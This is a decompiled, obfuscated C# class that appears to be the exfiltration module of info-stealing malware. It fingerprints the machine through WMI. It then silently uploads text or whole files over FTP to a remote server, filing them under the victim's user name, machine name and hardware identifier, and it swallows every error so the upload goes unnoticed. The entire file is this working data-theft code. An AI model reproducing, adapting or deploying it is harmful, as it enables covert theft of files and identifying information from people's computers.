using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace UvfJgsTEpPeNG;

internal sealed class TMTDkgXErfWF
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string TRsCyFoFQQ()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a8: Expected O, but got Unknown
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107371023));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107370970)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text = getString_0(107370985);
			ManagementObject val3 = new ManagementObject(getString_0(107370436) + text + getString_0(107370395));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107370390)).ToString();
		}
		catch (Exception)
		{
			return getString_0(107361749);
		}
	}

	public static void PgjMDdWkxqpxHt(string qdpUtFvuVUj = "URL", string mbUlMfRHtZsvv = "USERNAME", string ZnKEvwGmvUW = "ACCESO", string WbedvficKdU = "")
	{
		try
		{
			string text = TRsCyFoFQQ();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(qdpUtFvuVUj + getString_0(107374755) + Environment.UserName + getString_0(107374742) + Environment.MachineName + getString_0(107374721) + text + getString_0(107374716));
			ftpWebRequest.Method = getString_0(107370365);
			ftpWebRequest.Credentials = new NetworkCredential(mbUlMfRHtZsvv, ZnKEvwGmvUW);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(WbedvficKdU);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void tDMJSqxtmwIff(string HgIBfHuIDT = "URL", string DFTthaLpNbwaVM = "USERNAME", string WOAqTwHXgYtG = "ACCESO", string qjdnEpVBChRZtI = "")
	{
		try
		{
			string text = TRsCyFoFQQ();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(HgIBfHuIDT + getString_0(107374755) + Environment.UserName + getString_0(107374742) + Environment.MachineName + getString_0(107374721) + text + getString_0(107374721) + Path.GetFileName(qjdnEpVBChRZtI));
			ftpWebRequest.Method = getString_0(107370365);
			ftpWebRequest.Credentials = new NetworkCredential(DFTthaLpNbwaVM, WOAqTwHXgYtG);
			byte[] array = File.ReadAllBytes(qjdnEpVBChRZtI);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static TMTDkgXErfWF()
	{
		Strings.CreateGetStringDelegate(typeof(TMTDkgXErfWF));
	}
}
